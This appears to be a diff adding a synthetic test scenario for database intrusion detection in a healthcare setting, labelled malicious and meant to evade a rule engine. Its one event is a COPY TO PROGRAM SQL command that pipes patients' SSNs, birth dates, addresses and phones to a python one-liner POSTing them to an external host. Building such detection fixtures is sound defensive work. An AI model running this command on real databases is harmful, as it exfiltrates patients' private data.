@@ -1,0 +1,31 @@
+scenario_id: gen_healthcare_53_copy_to_program_mal_1518m
+family_id: gen_healthcare_53_copy_to_program_fam_1518
+domain: healthcare
+time_of_day: 03:35
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: exfil
+  role: research_etl_service
+  anchor: db
+  timing:
+    tempo: steady
+    step_gaps_seconds:
+    - 8.0
+  events:
+  - step_id: dump
+    sql: COPY (SELECT ssn, date_of_birth, address, phone FROM patients) TO PROGRAM
+      'python3 -c "import urllib.request,sys; urllib.request.urlopen(urllib.request.Request(\"https://warehouse.corp/ingest\",
+      data=sys.stdin.buffer.read(), method=\"POST\"))"'
+    connects_to:
+      ip: 10.2.38.112
+      port: 9001
+matched_pair_id: gen_healthcare_53_copy_to_program_pair_1518
+matched_dimensions:
+  fixed:
+  - process_tree_shape
+  - syscall_sequence
+  - timing_pattern
+  - role
+  varied:
+  - sql_content
